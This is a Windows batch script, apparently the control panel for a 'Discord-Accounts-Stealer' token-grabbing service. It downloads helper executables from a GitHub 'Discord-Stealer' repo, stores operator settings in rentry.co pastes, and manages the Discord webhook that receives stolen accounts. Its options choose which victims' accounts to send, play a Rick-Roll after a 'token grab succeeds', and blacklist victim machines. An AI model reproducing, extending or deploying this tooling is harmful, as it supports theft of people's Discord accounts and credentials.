@echo off
setlocal enabledelayedexpansion
pushd %~dp0
set "Default=[0m" & set "bgwhite=[107m" & set "bgblack=[40m" & set "bgyellow=[43m" & set "black=[30m" & set "red=[31m" & set "green=[32m" & set "yellow=[33m" & set "blue=[34m" & set "magenta=[35m" & set "cyan=[36m" & set "white=[37m" & set "grey=[90m" & set "brightred=[91m" & set "brightgreen=[92m" & set "brightyellow=[93m" & set "brightblue=[94m" & set "brightmagenta=[95m" & set "brightcyan=[96m" & set "brightwhite=[97m" & set "underline=[4m" & set "underlineoff=[24m"
mode 140,30

set ScriptVersion=3.1
set "AccountSystemVersions=!ScriptVersion! 3.0"
set "RequiredFilesPath=%temp%\DAS v!ScriptVersion!\Account-Manager"

title Discord Account Management Tool
if not exist "!RequiredFilesPath!\rentry.exe" (
    echo:
    echo !grey!Downloading required files . . .!white!
    <nul curl --create-dirs --ssl-no-revoke -fskLo "!RequiredFilesPath!\rentry.exe" "https://github.com/agamsol/Discord-Stealer/raw/main/Account-Manager/src/rentry.exe"
)
if not exist "!RequiredFilesPath!\cmdbkg.exe" (
    echo:
    echo !grey!Downloading required files . . .!white!
    <nul curl --create-dirs --ssl-no-revoke -fsLko "!RequiredFilesPath!\cmdbkg.exe" "https://github.com/agamsol/Discord-Stealer/raw/main/Account-Manager/cmdbkg/cmdbkg.exe"
)
if not exist "!RequiredFilesPath!\Discord Stealer.jpg" (
    <nul curl --create-dirs --ssl-no-revoke -fskLo "!RequiredFilesPath!\Discord Stealer.jpg" "https://github.com/agamsol/Discord-Stealer/raw/main/Account-Manager/src/Discord%%20Stealer.jpg"
)
if exist "!RequiredFilesPath!\cmdbkg.exe" call "!RequiredFilesPath!\cmdbkg.exe" "!RequiredFilesPath!\Discord Stealer.jpg" /t 10



:LOGIN
if not exist "!RequiredFilesPath!\config.bat" (
    title Discord Account Management Tool - Login to account
    echo:
    set /p "commandline=!white!%username%@%computername%:~# "
    for /f "tokens=1-4 delims= " %%a in ("!commandline!") do (
        if /i "%%a"=="login" (
            call :LOAD_ACCOUNT_INFO "%%b"
            set "AccountID=%%b"
            set "AccountPassword=%%c"
            call :CHECK_PASSWORD

            >"!RequiredFilesPath!\config.bat" (
                echo set "AccountID=%%b"
                echo set "AccountPassword=%%c"
            )
            goto :SETTINGS_MENU
        ) else (
            echo !brightred!ERROR!white!: !red!command '%%a' not found.!white!
            timeout /t 4 /nobreak>nul
            goto :LOGIN
        )
    )
)
call "!RequiredFilesPath!\config.bat"

echo:
echo  !grey!Attempting to login to account "!AccountID!".!white!

call :LOAD_ACCOUNT_INFO "!AccountID!"
call :CHECK_PASSWORD

:SETTINGS_MENU
call :CHECK_WEBHOOK "!Webhook!"
if "!ValidWebhook!"=="true" (
    set "WebhookStatus=!green!WORKING!grey!"
) else (
    set "WebhookStatus=!red!DOES NOT WORK!grey!"
)
if /i "!Send-Unverified-Accounts!"=="false" (
    set "Send-Unverified-Accounts-Status=!red!NO!grey!"
) else (
    set "Send-Unverified-Accounts-Status=!green!YES!grey!"
)
if /i "!Send-Unclaimed-Accounts!"=="false" (
    set "Send-Unclaimed-Accounts-Status=!red!NO!grey!"
) else (
    set "Send-Unclaimed-Accounts-Status=!green!YES!grey!"
)

if /i "!RickRoll-Plugin!"=="true" (
    set "RickRoll-Plugin-Status=!green!ON!grey!"
) else (
    set "RickRoll-Plugin-Status=!red!OFF!grey!"
)
set BlackListStatus=0
for %%a in (!BlackList!) do set /a BlackListStatus+=1
chcp 65001>nul
cls
title Account Settings - !AccountID!
echo:!grey!
echo   !brightred!1 !brightblue!^> !grey!Account's Discord Webhook ^(!WebhookStatus!^)!white!
echo          Modify, View ^& Test current Webhook URL.
echo:
echo   !brightred!2 !brightblue!^> !grey!Send Unverified Accounts ^(!Send-Unverified-Accounts-Status!^)!white!
echo          Send Discord Accounts who didn't verify their mail address.
echo:
echo   !brightred!3 !brightblue!^> !grey!Send Unclaimed Accounts ^(!Send-Unclaimed-Accounts-Status!^)!white!
echo          Send Discord Accounts who doesn't have a mail address linked to their discord account
echo:
echo   !brightred!4 !brightblue!^> !grey!Rick-Roll plugin ^(!RickRoll-Plugin-Status!^)!white!
echo          If the the token grab succceeds and this is turned !green!ON!white!,
echo               Rick-Roll will start playing in background after the discord account was sent to you
echo:
echo   !brightred!5 !brightblue!^> !grey!Black-List a computer or user ^(!yellow!!BlackListStatus! Blocked Computers!grey!^)!white!
echo          If someone is spamming your discord webhook, you can block notifications from his computer
echo               using the information under the 'HOST' field in your discord account embed.
echo:
echo   !brightred!6 !brightblue!^> !grey!Logout from this account
echo:
echo   !brightred!7 !brightblue!^> !grey!View Admin Panel
echo          !white!Only Program Admins can use this feature
echo:
echo   !grey!Accounts ^> !underline!!AccountID!!underlineoff! ^> !brightblue!!Version:Discord-Accounts-Stealer =! - !ScriptVersion!!white!
echo:
set /p "commandline=--> "
set int.commandline=
if !commandline! equ 1 (
    :WEBHOOK_MANAGEMENT_PAGE
    call :CHECK_WEBHOOK "!Webhook!"
    if /i "!ValidWebhook!"=="true" (
        set "Webhook-Status-management-page=STATUS: !green!This webhook is working.!white!"
    ) else (
        set "Webhook-Status-management-page=STATUS: !brightred!This webhook does not work.!white!"
    )
    cls
    echo:
    echo  !grey!Your current webhook is -
    echo    https://discord.com/api/webhooks/!Webhook!
    echo         !Webhook-Status-management-page!
    echo:
    echo  !brightred!1 !brightblue!^> !grey!Send test nessage to the webhook
    echo:
    echo  !brightred!2 !brightblue!^> !grey!Change the current webhook URL
    echo:
    set /p "int.commandline=!white!--> "
    set WEBHOOK_MENU=false
    if !int.commandline! equ 1 (
        if not "!ValidWebhook!"=="true" (
            echo:
            echo   !brightred!ERROR!white!: !red!Invalid Webhook URL, Please change it and try again.
            timeout /t 4 /nobreak>nul
            goto :WEBHOOK_MANAGEMENT_PAGE
        )
        echo:
        echo   Sending test message to the webhook . . .
        >"%temp%\Test message.txt" echo {"username":"","content":"**Test message**\n- [Webhook URL](!FULLWebhook!)\n- Account ID: `!AccountID!`\n- From HOST: `!computername!\\!username!`","embeds":[],"components":[]}

        for /f "delims=" %%a in ('curl -sX POST -H "Content-Type: application/json" -d "@%temp%\Test message.txt" "!FULLWebhook!?wait=true"') do (
            set "MsgID=%%a"
            echo:
            echo   Test message was sent with the ID '!brightblue!!MsgID:~8,18!!grey!'.!white!
        )
        del /s /q "%temp%\Test message.txt">nul 2>&1
        timeout /t 10 /nobreak>nul
        goto :WEBHOOK_MANAGEMENT_PAGE
    )
    if !int.commandline! equ 2 (
        echo:
        echo  !grey!Please enter your new webhook URL!white!
        echo:
        set /p "int.commandline.webhook=--> "

        for /f "tokens=5* delims=/" %%a in ("!int.commandline.webhook!") do (
            call :CHECK_WEBHOOK "%%a/%%b"
            if not "!ValidWebhook!"=="true" (
                echo:
                echo   !brightred!ERROR!white!: !red!Invalid Webhook URL . . .
                timeout /t 4 /nobreak>nul
                goto :WEBHOOK_MANAGEMENT_PAGE
            )
            set WEBHOOK_MENU=true
            set Unsaved=true
        )
    )
    if not "!Unsaved!"=="true" goto :SETTINGS_MENU
)
if !commandline! equ 2 (
    if /i "!Send-Unverified-Accounts!"=="false" (
        set Send-Unverified-Accounts=true
    ) else (
        set Send-Unverified-Accounts=false
    )
    set Unsaved=true
)
if !commandline! equ 3 (
    if /i "!Send-Unclaimed-Accounts!"=="false" (
        set Send-Unclaimed-Accounts=true
    ) else (
        set Send-Unclaimed-Accounts=false
    )
    set Unsaved=true
)
if !commandline! equ 4 (
    if /i "!RickRoll-Plugin!"=="false" (
        set RickRoll-Plugin=true
    ) else (
        set RickRoll-Plugin=false
    )
    set Unsaved=true
)
if !commandline! equ 5 (
    :BLACKLIST_MENU
    set BlackListedCountStatus=0
    for %%a in (!BlackList!) do set /a BlackListedCountStatus+=1
    cls
    echo:
    echo   !grey!Currently, There are !brightblue!!BlackListedCountStatus! blacklisted computers!grey! . . .
    echo:
    echo   !brightred!1 !brightblue!^> !grey!View ^& Remove Black-Listed Computers.
    echo:
    echo   !brightred!2 !brightblue!^> !grey!Add computer to the black-list..
    echo:
    set /p "int.commandline=--> "
    if !int.commandline! equ 1 (
        if !BlackListedCountStatus! lss 1 (
            echo:
            echo   !brightred!ERROR!white!: !red!You do not have any blacklisted computers.
            timeout /t 4 /nobreak>nul
            goto :BLACKLIST_MENU
        )
        echo:
        for /L %%i in ( 1 1 !BlackListNumeric!) do (
            set "blacklisted[%%i]="
            set "BlacklistedInterface[%%i]="
        )
        set BlackListNumeric=
        for %%a in (!BlackList!) do (
            set /a BlackListNumeric+=1
            set "Blacklisted[!BlackListNumeric!]=%%a"
            set "BlacklistedInterface[!BlackListNumeric!]=%%a"
        )
        cls
        echo:
        echo   !grey!Showing all blacklisted Users, Machines.
        echo.
        for /L %%a in (1 1 !BlackListNumeric!) do (
            if not "!BlacklistedInterface[%%a]:%%computername%%=!"=="!BlacklistedInterface[%%a]!" (
                set "BlacklistedInterface[%%a]=Specific User - !BlacklistedInterface[%%a]:%%computername%%\=!"
            )
            if not "!BlacklistedInterface[%%a]:%%username%%=!"=="!BlacklistedInterface[%%a]!" (
                set "BlacklistedInterface[%%a]=Specific Machine - !BlacklistedInterface[%%a]:\%%username%%=!"
            )
            if "!BlacklistedInterface[%%a]:Specific=!"=="!BlacklistedInterface[%%a]!" (
                set "BlacklistedInterface[%%a]=FULL HOST - !BlacklistedInterface[%%a]!"
            )
            echo   %%a. !BlacklistedInterface[%%a]:"='!
        )
        echo:
        echo   !grey!Select a User / Machine by using its number !red!to remove!grey! it from the blacklist.
        echo        !yellow!NOTE!white!: !grey!You can reset the blacklist by typing '!brightblue!RESET!grey!'.
        echo:
        set /p "int.RemoveFromBL=--> "
        if /i "!int.RemoveFromBL!"=="RESET" (
            echo:
            echo   !red!RESETTING !grey!YOUR BLACKLISTED !red!USERS!grey!, !red!MACHINES!grey! AND !red!HOSTS!grey!.
            timeout /t 3 /nobreak>nul
            set BlackList=
            set Unsaved=true
        )
        if defined Blacklisted[!int.RemoveFromBL!] (
            for /f "delims=" %%a in ("!int.RemoveFromBL!") do (
                for /f "delims=" %%b in ("!BlacklistedInterface[%%a]!") do (
                    for /f "delims=" %%c in ("!Blacklisted[%%a]!") do (
                        set InterfaceView=%%b
                        set SystemRead=%%c
                        set "InterfaceView=!InterfaceView:"=!"
                        set "InterfaceView=!InterfaceView:- ='$color$!"
                        echo:
                        echo   !grey!Removing !InterfaceView:$color$=%brightblue%!!grey!' from blacklist.
                        for /f "delims=" %%d in ("!SystemRead!") do (
                            set "BlackList=!BlackList:%%d=!"
                            set Unsaved=true
                        )
                    )
                )
            )
        )
    )
    if !int.commandline! equ 2 (
        cls
        echo:
        echo   !brightred!1 !brightblue!^> !grey!Blacklist specific windows user-name
        echo:
        echo   !brightred!2 !brightblue!^> !grey!Blacklist specific windows computer
        echo:
        echo   !brightred!3 !brightblue!^> !grey!Blacklist specific computer and host ^(!green!Most Secure!grey!^)
        echo:
        set /p "int.2.BlackListCategory=!white!--> "
        if !int.2.BlackListCategory! equ 1 (
            echo:
            echo  !grey!Provide the User-name to blacklist
            echo:
            set /p "int.3.username=!white!--> "
            echo:
            echo   !grey!Adding the user '!int.3.username!' to black-list
            set "BlackList=!BlackList! "%%computername%%\!int.3.username!""
            call :UPDATE_SETTINGS
            echo:
            echo   !grey!User has been successfully !brightgreen!added !grey!to black-list.!white!
            set Unsaved=true
        )
        if !int.2.BlackListCategory! equ 2 (
            echo:
            echo  !grey!Provide the Machine-name to blacklist
            echo:
            set /p "int.3.machine=!white!--> "
            echo:
            echo   !grey!Adding the machine '!int.3.machine!' to black-list
            set "BlackList=!BlackList! "!int.3.machine!\%%username%%""
            call :UPDATE_SETTINGS
            echo:
            echo   !grey!Machine has been successfully !brightgreen!added !grey!to black-list.!white!
            set Unsaved=true
        )
        if !int.2.BlackListCategory! equ 3 (
            echo:
            echo  !grey!Provide the HOST to blacklist
            echo:
            set /p "int.3.HOST=!white!--> "
            echo:
            echo   !grey!Adding the HOST '!int.3.HOST!' to black-list
            set "BlackList=!BlackList! "!int.3.HOST!""
            call :UPDATE_SETTINGS
            echo:
            echo   !grey!HOST has been successfully !brightgreen!added !grey!to black-list.!white!
            set Unsaved=true
        )
        if "!Unsaved!"=="true" (
            timeout /t 4 /nobreak>nul
            goto :BLACKLIST_MENU
        )
    )

)
if !commandline! equ 6 (
    :LOGOUT_ACCOUNT
    echo:
    echo   !grey!Logging out from !underline!!AccountID!!underlineoff! . . .
    del /s /q "!RequiredFilesPath!\config.bat">nul 2>&1
    timeout /t 4 >nul
    cls
    goto :LOGIN
)
if !commandline! equ 7 (
    :ADMIN_HELP_MENU
    cls
    echo:
    echo   !grey!Administrator management page
    echo:
    echo   !brightred!1 !brightblue!^> !grey!Reset Account Settings . . .
    echo          !white!Reset account settings back to default, asks if you would like to keep current webhook.
    echo:
    echo   !brightred!2 !brightblue!^> !grey!Send instructions to webhook . . .
    echo          !white!Send the instructions embed to the current webhook
    echo               this is good in a case the account author lost the original message which was sent
    echo                   at the account's creation date.
    echo:
    echo   !brightred!3 !brightblue!^> !grey!Delete this account
    echo               !white!permanently delete this account from discord-accunts-stealer database
    echo                    This action !red!cannot !white!be undone
    echo:
    call :ADMIN_SCRIPT_FUNCTIONS 2>nul || (
        echo   !brightred!ERROR!white!: !red!You do not have the permission to use these functions.
        timeout /t 5 /nobreak>nul
        goto :SETTINGS_MENU
    )
)
if "!Unsaved!"=="true" (
    set Unsaved=
    call :UPDATE_SETTINGS
    if "!WEBHOOK_MENU!"=="true" goto :WEBHOOK_MANAGEMENT_PAGE
    goto :SETTINGS_MENU
)
goto :SETTINGS_MENU

:: ADDONS
:LOAD_ACCOUNT_INFO <AccountID>
curl -f https://rentry.co/!AccountID!/raw >nul 2>&0 || (
    echo !brightred!ERROR!white!: !red!Account doesn't exist.!white!
    del /s /q "!RequiredFilesPath!\config.bat">nul 2>&1
    timeout /t 4 /nobreak>nul
    goto :LOGIN
)
set "parseValues= * "
for /f "delims=" %%a in ('curl -Lks "https://rentry.co/%~1/raw"') do (
    set "current=%%a"
    for /F "delims=#`" %%. in ("!current:~0,1!") do (
        if not "!current:*: =!"=="!current!" (
            for /f "tokens=1 delims=:" %%b in ("%%a") do set "key=%%b"
            for %%c in ("!key!") do (
                if not "!parseValues: %%~c =!"=="!parseValues!" (
                    set "!key!=!current:*: =!"
                ) else if "!parseValues!"==" * " set "!key!=!current:*: =!"
            )
        )
    )
)
if not defined Version (
    echo !brightred!ERROR!white!: !red!Could not verify account META!white!
    del /s /q "!RequiredFilesPath!\config.bat">nul 2>&1
    timeout /t 4 /nobreak>nul
    goto :LOGIN
)
for /f "tokens=1,2" %%a in ("!Version!") do (
    if not "%%a"=="Discord-Accounts-Stealer" (
        echo !brightred!ERROR!white!: !red!Could not verify account META!white!
        del /s /q "!RequiredFilesPath!\config.bat">nul 2>&1
        timeout /t 4 /nobreak>nul
        goto :LOGIN
    )
    for %%c in (!AccountSystemVersions!) do (
        if "v%%c"=="%%b" set AccountVersionValid=true
    )
    if not "!AccountVersionValid!"=="true" (
        echo !brightred!ERROR!white!: !red!Unsupported account version!white!
        del /s /q "!RequiredFilesPath!\config.bat">nul 2>&1
        timeout /t 4 /nobreak>nul
        goto :LOGIN
    )
)
exit /b

:CHECK_PASSWORD
<nul curl -sfkLo "!RequiredFilesPath!\SettingsBackup.txt" "https://rentry.co/!AccountID!/raw"
if not defined AccountPassword (
    echo !brightred!ERROR!white!: !red!Password not provided!white!
    del /s /q "!RequiredFilesPath!\config.bat">nul 2>&1
    timeout /t 4 /nobreak>nul
    goto :LOGIN
)
for /f "delims=" %%a in ('type "!RequiredFilesPath!\SettingsBackup.txt" ^| call "!RequiredFilesPath!\rentry.exe" edit -u "!AccountID!" --edit-code "!AccountPassword!"') do (
    echo:"%%a" | findstr /ic:"error">nul && (
        echo !brightred!ERROR!white!: !red!Access denied.!white!
        del /s /q "!RequiredFilesPath!\config.bat">nul 2>&1
        timeout /t 4 /nobreak>nul
        goto :LOGIN
    )
)
exit /b

:UPDATE_SETTINGS
>"!RequiredFilesPath!\Update-Account-Settings.txt" (
    echo ```yaml
    echo Version: Discord-Accounts-Stealer v!ScriptVersion!
    echo:
    echo Webhook: !Webhook!
    echo:
    echo # Account Settings
    echo Send-Unverified-Accounts: !Send-Unverified-Accounts!
    echo Send-Unclaimed-Accounts: !Send-Unclaimed-Accounts!
    echo:
    echo RickRoll-Plugin: !RickRoll-Plugin!
    echo:
    echo # You can blacklist a computer using his HOST name
    echo BlackList: !BlackList!
    echo ```
)
for /f "delims=" %%a in ('type "!RequiredFilesPath!\Update-Account-Settings.txt" ^| call "!RequiredFilesPath!\rentry.exe" edit -u "!AccountID!" --edit-code "!AccountPassword!"') do (
    echo "%%a" | findstr /c:"Ok">nul && echo:&echo   !grey!DATABASE HAS BEEN !green!SUCCESSFULLY !grey!UPDATED
)
exit /b

:CHECK_WEBHOOK <Webhook>
set ValidWebhook=
set "temp.webhook=%~1"
for /f "delims=" %%b in ('curl -sL "https://discord.com/api/webhooks/!temp.webhook!"') do (
    echo:"%%b"| findstr /c:"channel_id">nul && (
        if not defined ValidWebhook (
            set "FULLWebhook=https://discord.com/api/webhooks/!temp.webhook!"
            set Webhook=!temp.webhook!
            set "ValidWebhook=true"
        )
    )
)
exit /b
:: ADDONS

:: ADMIN SCRIPT
rem :ADMIN_SCRIPT_FUNCTIONS

:: ADMIN SCRIPT END
